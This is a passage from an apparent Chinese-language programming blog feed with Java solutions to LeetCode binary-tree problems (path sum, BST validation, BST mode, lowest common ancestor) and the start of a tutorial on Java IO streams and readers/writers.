class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        value = root.val;</span><br><span class="line">        findLeftValue(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">findLeftValue</span><span class="params">(TreeNode root, <span class="type">int</span> deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(deep &gt; Deep)&#123;</span><br><span class="line">                value = root.val;</span><br><span class="line">                Deep = deep;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>) findLeftValue(root.left, deep+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>) findLeftValue(root.right, deep+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    res = poll.val;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="112-路径总和"><a href="#112-路径总和" class="headerlink" title="112. 路径总和"></a>112. 路径总和</h2><p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum 。判断该树中是否存在 根节点到叶子节点 的路径，这条路径上所有节点值相加等于目标和 targetSum 。如果存在，返回 true ；否则，返回 false 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="comment">// 叶子结点</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left, targetSum);</span><br><span class="line">            <span class="keyword">if</span>(left) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right, targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98.验证二叉搜索树"></a>98.验证二叉搜索树</h2><p>给你一个二叉树的根节点 root ，判断其是否是一个有效的二叉搜索树。<br>有效 二叉搜索树定义如下：<br>节点的左子树只包含 小于 当前节点的数。<br>节点的右子树只包含 大于 当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)</span><br><span class="line">            stack.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">curr</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span>(curr != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(curr.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    stack.add(curr.right);</span><br><span class="line">                &#125;</span><br><span class="line">                stack.add(curr);</span><br><span class="line">                stack.add(<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span>(curr.left != <span class="literal">null</span>)</span><br><span class="line">                    stack.add(curr.left);</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(pre != <span class="literal">null</span> &amp;&amp; pre.val &gt;= temp.val)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                pre = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode max;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 左</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> isValidBST(root.left);</span><br><span class="line">        <span class="keyword">if</span>(!left)&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">        <span class="comment">// 中</span></span><br><span class="line">        <span class="keyword">if</span>(max != <span class="literal">null</span> &amp;&amp; root.val &lt;= max.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = root;</span><br><span class="line">        <span class="comment">// 右</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> isValidBST(root.right);</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isValidBST(root, Long.MIN_VALUE, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode node, <span class="type">long</span> lower, <span class="type">long</span> upper)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.val &lt;= lower || node.val &gt;= upper)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isValidBST(node.left, lower, node.val) &amp;&amp; isValidBST(node.right, node.val, upper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="501-二叉搜索树中的众数"><a href="#501-二叉搜索树中的众数" class="headerlink" title="501.二叉搜索树中的众数"></a>501.二叉搜索树中的众数</h2><p>给你一个含重复值的二叉搜索树（BST）的根节点 root ，找出并返回 BST 中的所有 众数（即，出现频率最高的元素）。</p><p>如果树中有不止一个众数，可以按 任意顺序 返回。</p><p>假定 BST 满足如下定义：</p><p>结点左子树中所含节点的值 小于等于 当前节点的值<br>结点右子树中所含节点的值 大于等于 当前节点的值<br>左子树和右子树都是二叉搜索树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; resList;</span><br><span class="line">    <span class="type">int</span> maxCount;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    TreeNode pre;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        maxCount = <span class="number">0</span>;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        pre = <span class="literal">null</span>;</span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; resList.size(); i++)&#123;</span><br><span class="line">            res[i] = resList.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span> root.val;</span><br><span class="line">        <span class="comment">// 计数</span></span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || rootValue != pre.val)&#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新结果及maxCount</span></span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount)&#123;</span><br><span class="line">            resList.clear();</span><br><span class="line">            resList.add(rootValue);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (count == maxCount)&#123;</span><br><span class="line">            resList.add(rootValue);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line">        findMode1(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a>236. 二叉树的最近公共祖先</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”<br>递归法解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span> || root == p || root == q)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 后序遍历</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迭代法解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root, pre = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span> || !st.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">                st.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = st.pop();</span><br><span class="line">            <span class="keyword">if</span>(cur.right == <span class="literal">null</span> || cur.right == pre)&#123;</span><br><span class="line">                <span class="comment">// p/q是 中/左 或者 中/右 , 返回中</span></span><br><span class="line">                <span class="keyword">if</span>(cur == p || cur == q)&#123;</span><br><span class="line">                    <span class="keyword">if</span> ((cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max) || (cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max))&#123;</span><br><span class="line">                        <span class="keyword">return</span> cur;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cur.val = max;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// p/q是 左/右 , 返回中</span></span><br><span class="line">                <span class="keyword">if</span> (cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max &amp;&amp; cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max)&#123;</span><br><span class="line">                    <span class="keyword">return</span> cur;                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// MAX_VALUE 往上传递</span></span><br><span class="line">                <span class="keyword">if</span>((cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max) || (cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max))&#123;</span><br><span class="line">                    cur.val = max;</span><br><span class="line">                &#125;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                st.push(cur);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】Java IO详解</title>
      <link href="/2024/10/25/code/javaIO/"/>
      <url>/2024/10/25/code/javaIO/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/25/code/javaIO/image.png"></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Java IO（输入&#x2F;输出）是 Java 编程语言中处理输入和输出操作的一部分，它位于 <code>java.io</code> 包中。这个包提供了丰富的类和接口，用于读写数据到文件、网络连接或其他源。</p><h3 id="Java-IO-的主要组成"><a href="#Java-IO-的主要组成" class="headerlink" title="Java IO 的主要组成"></a>Java IO 的主要组成</h3><p>Java IO 主要可以分为两大类：流（Stream）和读写器（Reader&#x2F;Writer）。其实也就是按照传输方式划分可以分为：按字节传输、按字符传输，通常来说，一个字母或一个字符占用一个字节，一个汉字占用两个字节，具体还要看字符编码，比如说在 UTF-8 编码下，一个英文字母（不分大小写）为一个字节，一个中文汉字为三个字节；在 Unicode 编码中，一个英文字母为一个字节，一个中文汉字为两个字节。</p><p>字节流用来处理二进制文件，比如说图片啊、MP3 啊、视频啊。<br>字符流用来处理文本文件，文本文件可以看作是一种特殊的二进制文件，只不过经过了编码，便于人们阅读。<br>换句话说就是，<strong>字节流可以处理一切文件，而字符流只能处理文本</strong>。字节流本身没有缓冲区，缓冲字节流相对于字节流，效率提升非常高。而字符流本身就带有缓冲区，缓冲字符流相对于字符流效率提升就不是那么大了。</p><ol><li><p><strong>流（Stream）</strong></p><ul><li><strong>字节流</strong>：以字节为单位处理数据。主要类包括 <code>InputStream</code> 和 <code>OutputStream</code>。</li><li><strong>过滤流</strong>：在输入或输出流上提供额外的功能，如缓冲、数据转换等。常见的过滤流包括 <code>BufferedInputStream</code> 和 <code>BufferedOutputStream</code>。</li></ul></li><li><p><strong>读写器（Reader&#x2F;Writer）</strong></p><ul><li><strong>字符流</strong>：以字符为单位处理数据，更适合处理文本数据。主要类包括 <code>Reader</code> 和 <code>Writer</code>。</li><li><strong>转换流</strong>：<code>InputStreamReader</code> 和 <code>OutputStreamWriter</code>，它们可以将字节流和字符流之间进行转换。</li></ul></li></ol><p><strong>InputStream 类</strong></p><ul><li><code>int read()</code>：读取数据</li><li><code>int read(byte b[], int off, int len)</code>：从第 off 位置开始读，读取 len 长度的字节，然后放入数组 b 中</li><li><code>long skip(long n)</code>：跳过指定个数的字节</li><li><code>int available()</code>：返回可读的字节数</li><li><code>void close()</code>：关闭流，释放资源</li></ul><p><strong>OutputStream 类</strong></p><ul><li><code>void write(int b)</code>： 写入一个字节，虽然参数是一个 int 类型，但只有低 8 位才会写入，高 24 位会舍弃</li><li><code>void write(byte b[], int off, int len)</code>： 将数组 b 中的从 off 位置开始，长度为 len 的字节写入</li><li><code>void flush()</code>： 强制刷新，将缓冲区的数据写入</li><li><code>void close()</code>：关闭流</li></ul><p><strong>Reader 类</strong></p><ul><li><code>int read()</code>：读取单个字符</li><li><code>int read(char cbuf[], int off, int len)</code>：从第 off 位置开始读，读取 len 长度的字符，然后放入数组 b 中</li><li><code>long skip(long n)</code>：跳过指定个数的字符</li><li><code>int ready()</code>：是否可以读了</li><li><code>void close()</code>：关闭流，释放资源</li></ul><p><strong>Writer 类</strong></p><ul><li><code>void write(int c)</code>： 写入一个字符</li><li>&#96;void write( char cbuf[], int off, int len)： 将数组 cbuf 中的从 off 位置开始，长度为 len 的字符写入</li><li><code>void flush()</code>： 强制刷新，将缓冲区的数据写入</li><li><code>void close()</code>：关闭流</li></ul><h3 id="常用的-Java-IO-类"><a href="#常用的-Java-IO-类" class="headerlink" title="常用的 Java IO 类"></a>常用的 Java IO 类</h3><ul><li><code>File</code>：代表文件和目录路径名的抽象表示形式。</li><li><code>FileInputStream</code>&#x2F;<code>FileOutputStream</code>：用于读取和写入文件数据的字节流。</li><li><code>BufferedReader</code>&#x2F;<code>BufferedWriter</code>：提供缓冲的字符流，增加效率。</li><li><code>PrintWriter</code>：具有自动行刷新的字符输出流，可以输出不同数据类型的格式化表示。</li></ul><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>下面是使用 Java IO 类进行文件读写的基本示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaIOExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 写入文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>)))) &#123;</span><br><span class="line">            writer.println(<span class="string">&quot;Hello Java IO!&quot;</span>);</span><br><span class="line">            writer.println(<span class="string">&quot;Here is the second line.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;output.txt&quot;</span>))) &#123;</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在算法中的使用"><a href="#在算法中的使用" class="headerlink" title="在算法中的使用"></a>在算法中的使用</h3><p>Java IO 在算法中常用于数据的读取和写入，比如从文件读取数据进行处理，或将处理结果写入文件。例如，在数据分析、日志处理和大数据处理中，频繁的文件读写操作是必不可少的。使用缓冲流（如 <code>BufferedReader</code> 和 <code>BufferedWriter</code>）可以显著提高读写效率。</p><h3 id="操作对象划分"><a href="#操作对象划分" class="headerlink" title="操作对象划分"></a>操作对象划分</h3><p><img src="/2024/10/25/code/javaIO/image-1.png"><br>文件操作算是 IO 中最典型的操作了，也是最频繁的操作。那其实你可以换个角度来思考，比如说按照 IO 的操作对象来思考，IO 就可以分类为：文件、数组、管道、基本数据类型、缓冲、打印、对象序列化&#x2F;反序列化，以及转换等。</p><h2 id="Java-Flie"><a href="#Java-Flie" class="headerlink" title="Java Flie"></a>Java Flie</h2><p>java.io.File 